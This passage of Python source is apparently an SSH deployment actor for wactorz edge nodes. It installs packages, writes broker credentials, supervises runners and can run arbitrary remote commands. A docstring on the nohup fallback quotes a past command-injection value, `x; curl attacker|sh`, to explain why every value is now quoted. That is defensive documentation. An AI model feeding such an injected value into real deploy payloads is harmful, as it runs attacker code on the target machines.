                f"[{node_name}] {wheel.name} installed but cannot run as a node. "
                f"Something is shadowing it on this node — check for another wactorz "
                f"in the venv or on PYTHONPATH."
            )
            return False
        self._log_remote(f"[{node_name}] {wheel.name} installed from this machine.")
        return True

    async def _can_run_as_node(self, conn: Any, home: str) -> bool:
        """Whether the wactorz now on this node can actually be a node.

        Asked of the install rather than assumed from its version, because a
        version number is a claim and this is the thing being relied on. The
        failure it rules out is silent: every release before the node runtime
        answers to `wactorz==<that number>` and has no `wactorz.node` in it.
        """
        python = shlex.quote(f"{home}/wactorz/venv/bin/python")
        ok, _ = await self._ssh_run(conn, f"{python} -c 'import wactorz.node'")
        return ok

    async def _build_wheel(self) -> Path | None:
        """Build a wheel of this checkout, or None when there is no checkout.

        Off the event loop: a build takes seconds to minutes, and every actor in
        this process shares the loop it would otherwise hold.
        """
        root = Path(__file__).resolve().parent.parent.parent
        if not (root / "pyproject.toml").exists():
            return None
        out_dir = root / "dist"

        def _build() -> int:
            return subprocess.run(  # noqa: S603  # a literal argv naming this interpreter
                [sys.executable, "-m", "pip", "wheel", str(root), "--no-deps", "-w", str(out_dir)],
                capture_output=True,
                check=False,
            ).returncode

        if await asyncio.to_thread(_build) != 0:
            return None
        built = sorted(
            out_dir.glob(f"wactorz-{__version__}-*.whl"), key=lambda p: p.stat().st_mtime
        )
        return built[-1] if built else None

    def _log_remote(self, message: str):
        logger.info("[%s] %s", self.name, message)
        asyncio.create_task(
            self._mqtt_publish(
                f"agents/{self.actor_id}/logs",
                {"type": "log", "message": message, "timestamp": time.time()},
            )
        )

    async def _node_install(self, payload: dict) -> dict:
        """Install pip packages on a remote node via SSH.

        payload keys:
          host      — IP or hostname of the remote machine
          packages  — list of package names to install

        SSH auth is not a payload key — see _ssh_kwargs.
        """
        host = payload.get("host")
        packages = payload.get("packages", [])
        if isinstance(packages, str):
            packages = [p.strip() for p in packages.replace(",", " ").split()]
        if not host:
            return {"error": "Missing 'host' in payload"}
        if not packages:
            return {"error": "No packages specified"}

        refused = [p for p in packages if not is_installable_name(p)]
        if refused:
            # Refused rather than filtered: installing a subset silently would
            # report success for a request that was not carried out.
            return {"error": f"Not package names: {', '.join(refused)}"}

        # Two guards, because neither covers the other. `shlex.quote` stops
        # the value being read as *shell* syntax once this string reaches SSH;
        # the allow-list above stops it being read as *pip options*, which a
        # correctly quoted `--index-url=…` still would be.
        pkg_str = " ".join(shlex.quote(p) for p in packages)
        self._log_remote(f"Installing {pkg_str} on {host}...")

        try:
            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
                # Detect the right pip to use:
                # 1. Venv at ~/wactorz/venv (created by node_deploy) — always prefer this
                # 2. Fall back to python3 -m pip with --break-system-packages
                ok, venv_check = await self._ssh_run(
                    conn, "test -f ~/wactorz/venv/bin/pip && echo yes || echo no"
                )
                if venv_check.strip() == "yes":
                    pip_cmd = f"~/wactorz/venv/bin/pip install {pkg_str} -q 2>&1"
                    self._log_remote("Using venv pip at ~/wactorz/venv/bin/pip")
                else:
                    # No venv — try to create one first
                    self._log_remote("No venv found — creating ~/wactorz/venv first...")
                    await self._ssh_run(
                        conn, "mkdir -p ~/wactorz && python3 -m venv ~/wactorz/venv"
                    )
                    ok, venv_check2 = await self._ssh_run(
                        conn, "test -f ~/wactorz/venv/bin/pip && echo yes || echo no"
                    )
                    if venv_check2.strip() == "yes":
                        pip_cmd = f"~/wactorz/venv/bin/pip install {pkg_str} -q 2>&1"
                        self._log_remote("Venv created successfully")
                    else:
                        pip_cmd = (
                            f"python3 -m pip install {pkg_str} --break-system-packages -q 2>&1"
                        )
                        self._log_remote("Venv creation failed — falling back to system pip")

                ok, output = await self._ssh_run(conn, pip_cmd)
                if ok:
                    self._log_remote(f"✓ {pkg_str} installed on {host}")
                    return {
                        "success": True,
                        "host": host,
                        "packages": packages,
                        "output": output[-300:],
                    }
                self._log_remote(f"✗ Install failed on {host}: {output[-200:]}")
                return {"success": False, "host": host, "error": output[-400:]}

        except Exception as e:
            return {"success": False, "host": host, "error": str(e)}

    async def _node_deploy(self, payload: dict) -> dict:
        """Full bootstrap of a new Wactorz edge node via SSH.

        Steps:
          1. Create ~/wactorz/ directory
          2. Write ~/wactorz/.env — broker, credentials, signing key, TLS
          3. Install wactorz at this machine's version into a venv there
          4. Kill any runner already answering for this node name
          5. Install and start a systemd unit, or fall back to nohup
          6. Wait for its first heartbeat, and fail with its log if none arrives

        payload keys:
          host       — IP or hostname
          node_name  — name this node will use (default: "remote-node")
          broker     — MQTT broker host reachable FROM the Pi (default: "localhost")
          port       — MQTT broker port (default: 1883)

        SSH auth is not a payload key: the user and credentials come from the
        node's configured deploy target (see _ssh_kwargs).
        """
        requested_host = payload.get("host")
        node_name = payload.get("node_name", "remote-node")
        broker = payload.get("broker", "localhost")
        mqtt_port = payload.get("port", 1883)

        # Before anything reaches the network: a name that cannot be an MQTT
        # topic level yields a runner the broker refuses on every operation,
        # so it would retry forever while this deploy reported success.
        name_problem = deploy_name_error(str(node_name))
        if name_problem:
            self._log_remote(f"Refusing deploy: {name_problem}")
            return {
                "success": False,
                "node_name": node_name,
                "host": requested_host,
                "error": name_problem,
            }

        target = self._resolve_ssh_target(payload)
        if target is None:
            return {
                "success": False,
                "node_name": node_name,
                "host": requested_host,
                "error": (
                    f"No deploy target configured for '{node_name}' ({requested_host}). "
                    f"Set DEPLOY_TARGETS and the {deploy_env_prefix(node_name)}_* block."
                ),
            }
        try:
            host = await self._resolve_target_host(target, str(requested_host or ""))
        except PermissionError as exc:
            return {
                "success": False,
                "node_name": node_name,
                "host": requested_host,
                "error": str(exc),
            }
        # The target's user is authoritative — the remote paths below are built
        # from it, so taking it from the payload would let a caller write the
        # runner into a different account than the one it authenticates as.
        user = target.user

        self._log_remote(f"Deploying node '{node_name}' to {user}@{host}...")
        # A heartbeat older than this is the previous runner's, not the new one's.
        self._deploy_started_at = time.time()

        try:
            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
                # 1. Create directory
                await self._ssh_run(conn, "mkdir -p ~/wactorz")
                # Ask the node where that landed rather than assuming
                # /home/<user>. Every shell step here uses `~`, so a home that
                # is not under /home — root's /root, an LDAP or /var/lib one —
                # would put the uploads and the unit somewhere the venv is not.
                # This is why deploying as root never worked.
                _, resolved = await self._ssh_run(conn, "cd ~ && pwd")
                home_dir = resolved.strip() or f"/home/{user}"
                self._log_remote(f"[{node_name}] Directory created at {home_dir}/wactorz.")

                # 2. Write the credentials the node will read from its
                # environment. The CA goes too when the node is to reach the
                # broker over TLS, which also decides the port every later step
                # starts the runner with.
                async with conn.start_sftp_client() as sftp:
                    tls = await self._decide_node_tls(
                        conn, sftp, target, home_dir, str(broker), int(mqtt_port)
                    )
                    mqtt_port = tls.port
                    # Two questions answered before anything is written that the
                    # node will act on, each from the only place it can be
                    # answered: the node says whether it can open the broker's
                    # port, and the server -- which can reach the broker -- says
                    # whether the broker accepts the account the node is about to
                    # be given. A node started without either answer retries for
                    # ever, with the reason in a journal nobody is reading.
                    await self._check_broker_reachable(conn, node_name, str(broker), mqtt_port)
                    await self._check_node_account(target, node_name)
                    has_credentials = await self._put_node_env(
                        sftp, target, home_dir, node_name, str(broker), mqtt_port, tls
                    )
                self._log_remote(f"[{node_name}] Node environment written to ~/wactorz/.env.")
                self._log_remote(
                    f"[{node_name}] Broker connection: "
                    f"{'TLS' if tls.enabled else 'plain MQTT'} on port {mqtt_port}. {tls.note}"
                )
                if has_credentials:
                    self._log_remote(f"[{node_name}] Broker credentials included.")

                # 3. Create venv if it doesn't exist — avoids all --break-system-packages issues
                _, out = await self._ssh_run(
                    conn,
                    "test -d ~/wactorz/venv && echo exists || python3 -m venv ~/wactorz/venv && echo created",
                )
                self._log_remote(f"[{node_name}] venv: {out.strip()}")

                # 4. Install wactorz itself into the venv. The node runs the
                # package, not a copy of one file, so its agents are the same
                # DynamicAgent main runs.
                installed = await self._install_wactorz(conn, node_name, home_dir)
                if not installed:
                    return {
                        "success": False,
                        "node_name": node_name,
                        "host": host,
                        "error": (
                            f"Could not install wactorz {__version__} on {host}. "
                            f"The node needs it to run; see this node's log above for pip's "
                            f"own account of why."
                        ),
                    }

                # 5. Kill any existing instance with this node name. This runs
                # whatever supervision we end up installing: a node deployed
                # before this step existed has a `nohup` runner live right now,
                # and starting a unit beside it would leave two runners
                # answering the same control topics.
                # The pattern is quoted as one argument rather than wrapped in
                # literal quotes: a name containing a quote would otherwise end
                # them and the rest would be read as more shell.
                # Matches both spellings: the unit started by this deploy
                # (`wactorz --node <name>`) and the single-file runner a node
                # deployed before the package was installed there is still
                # running (`remote_runner.py --name <name>`).
                pattern = f"(wactorz.*--node|remote_runner.py.*--name) {node_name}"
                await self._ssh_run(conn, f"pkill -f {shlex.quote(pattern)} 2>/dev/null; true")

                # 6. Clear anything retained on this node's control topics, before
                # it is started and subscribes to them.
                await self._clear_planted_control(node_name)

                # 7. Supervise it — a systemd unit at the least-privileged rung
                # this node supports, and `nohup` only when it supports none.
                async def run_on_node(command: str) -> tuple[bool, str]:
                    return await self._ssh_run(conn, command)

                rung = await node_service.install(run_on_node, user=user, home=home_dir)
                if rung is node_service.NOHUP:
                    await self._ssh_run(conn, self._nohup_launch(node_name, broker, mqtt_port))
                self._log_remote(f"[{node_name}] Runner started — supervision: {rung.label}.")

                # 8. Started is not connected. Wait for the node to say so itself,
                # and when it does not, bring back what it logged instead of
                # reporting a success the dashboard will contradict.
                heartbeat_error = await self._await_first_heartbeat(node_name)
                if heartbeat_error:
                    tail = await self._node_log_tail(conn, rung, node_name)
                    msg = f"[{node_name}] {heartbeat_error}"
                    if tail:
                        msg += f"\nThe node's log ends with:\n{tail}"
                    self._log_remote(msg)
                    return {
                        "success": False,
                        "node_name": node_name,
                        "host": host,
                        "supervision": rung.label,
                        "error": msg,
                    }

            self._log_remote(f"[{node_name}] Deploy complete! Node is online.")
            # Record where the node lives; credentials stay in the environment.
            self._persist_node_info(node_name=node_name, host=host, user=user)
            return {
                "success": True,
                "node_name": node_name,
                "host": host,
                "broker": broker,
                "broker_port": mqtt_port,
                "tls": tls.enabled,
                # Reported rather than inferred: a node that fell back to nohup
                # is otherwise indistinguishable from a supervised one, and the
                # difference is whether it comes back after a reboot.
                "supervision": rung.label,
                "message": (
                    f"Node '{node_name}' deployed to {user}@{host} ({rung.label}), "
                    f"{'TLS' if tls.enabled else 'plain MQTT'} to the broker. "
                    f"Its first heartbeat has arrived."
                ),
            }

        except Exception as e:
            msg = f"Deploy failed for '{node_name}' on {host}: {e}"
            self._log_remote(msg)
            return {"success": False, "node_name": node_name, "host": host, "error": str(e)}

    async def _check_broker_reachable(
        self, conn: Any, node_name: str, broker: str, port: int
    ) -> None:
        """Fail the deploy when the node cannot open the broker's port.

        Run on the node, because that is where the answer is true: the server
        reaching the broker says nothing about a firewall between the broker's
        host and the node, or an address that only resolves on the server.
        """
        ok, output = await self._ssh_run(conn, reach_check_command(broker, port))
        if ok:
            self._log_remote(f"[{node_name}] The broker answers on {broker}:{port} from the node.")
            return
        reason = (output.splitlines() or ["no answer"])[-1][:200]
        raise BrokerUnreachableFromNodeError(node_name, broker, port, reason)

    async def _check_node_account(self, target: DeployTarget, node_name: str) -> None:
        """Fail the deploy when the broker refuses the account the node would be given.

        Checked from the server, against the broker the server itself uses, with
        exactly the username and password that are about to be written to the
        node. A mistyped password, a comment that became one, or an account no
        broker has are all caught here rather than in the node's journal.

        Skipped where the check could not be honest: a node whose broker address
        differs from the server's may well be talking to a different broker.
        """
        if target.broker and target.broker != CONFIG.mqtt_host:
            return
        username, password = self._node_account(target, node_name)
        if not (username or password):
            return
        try:
            await asyncio.wait_for(
                self._connect_once(username, password, node_name), CREDENTIAL_CHECK_TIMEOUT_S
            )
        except asyncio.TimeoutError as exc:
            raise BrokerRefusedNodeAccountError(node_name, username, "no answer in time") from exc
        except Exception as exc:
            raise BrokerRefusedNodeAccountError(node_name, username, str(exc)[:200]) from exc
        self._log_remote(f"[{node_name}] The broker accepts the node's account.")

    @staticmethod
    async def _connect_once(username: str, password: str, node_name: str) -> None:
        """Open and close one broker connection as the node would."""
        async with mqtt_client(
            CONFIG.mqtt_host,
            CONFIG.mqtt_port,
            username=username,
            password=password or None,
            identifier=client_id("srv", install_id(), f"deploy-{node_name}"),
        ):
            pass

    async def _await_first_heartbeat(self, node_name: str) -> str | None:
        """Wait for main to record a heartbeat from the node; the failure text if none.

        Read off main's own node table, so the deploy reports the same fact the
        dashboard does. No main in the registry -- the installer running on its
        own -- means there is nobody to ask, and the wait is skipped rather than
        failed.
        """
        main = find_main_actor(self._registry)
        if main is None:
            return None
        deadline = time.monotonic() + FIRST_HEARTBEAT_TIMEOUT_S
        while time.monotonic() < deadline:
            seen = main._known_nodes.get(node_name, {}).get("last_seen", 0.0)
            if seen and seen >= self._deploy_started_at:
                return None
            await asyncio.sleep(1.0)
        return (
            f"The node started but sent no heartbeat within "
            f"{FIRST_HEARTBEAT_TIMEOUT_S}s. It is still running there and will keep "
            f"retrying; the reason is in its log."
        )

    async def _node_log_tail(self, conn: Any, rung: Any, node_name: str) -> str:
        """The last lines the node logged, for a deploy that failed."""
        if rung is node_service.NOHUP:
            command = f"tail -n 12 ~/wactorz/{shlex.quote(node_name + '.log')} 2>/dev/null"
        else:
            journal = "journalctl --user" if rung is node_service.USER else "journalctl"
            command = f"{journal} -u {node_service.UNIT_NAME} -n 12 --no-pager -o cat 2>/dev/null"
        _, output = await self._ssh_run(conn, command)
        return output.strip()[:1500]

    @staticmethod
    def _nohup_launch(node_name: str, broker: Any, mqtt_port: Any) -> str:
        """The unsupervised fallback: what ran on every node before the unit.

        Every interpolated value is quoted. `broker` comes straight off the task
        payload with no validation, so `--broker` used to accept
        `x; curl attacker|sh` and run it on the node. `node_name` is checked by
        `deploy_name_error`, but that only forbids the MQTT topic characters
        `# + /` — a space, a `;` or a `$(…)` is a perfectly acceptable node name
        as far as it is concerned. `~` is left outside the quotes so the remote
        shell still expands it.

        The environment is sourced, never passed. Putting MQTT_PASSWORD=… in
        front of the command would keep it out of the *runner's* argv, but SSH
        exec runs `$SHELL -c '<the whole string>'`, and that wrapper's argv is
        readable by any local user with `ps` for as long as the launch takes.
        Sourcing a 0600 file puts it in no argv at all.
        """
        log_path = shlex.quote(f"{node_name}.log")
        return (
            "set -a; . ~/wactorz/.env; set +a; "
            "nohup ~/wactorz/venv/bin/wactorz "
            f"--mqtt-broker {shlex.quote(str(broker))} "
            f"--mqtt-port {shlex.quote(str(mqtt_port))} "
            f"--node {shlex.quote(node_name)} "
            f"> ~/wactorz/{log_path} 2>&1 &"
        )

    async def _node_run(self, payload: dict) -> dict:
        """Run an arbitrary shell command on a remote node via SSH.

        payload keys:
          host     — IP or hostname
          command  — shell command to run

        SSH auth is not a payload key — see _ssh_kwargs.
        """
        host = payload.get("host")
        command = payload.get("command", "echo hello")
        if not host:
            return {"error": "Missing 'host' in payload"}

        self._log_remote(f"Running on {host}: {command[:80]}")
        try:
            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
                ok, output = await self._ssh_run(conn, command)
                return {
                    "success": ok,
                    "host": host,
                    "command": command,
                    "output": output,
                    "exit_code": 0 if ok else 1,
                }
        except Exception as e:
            return {"success": False, "host": host, "error": str(e)}
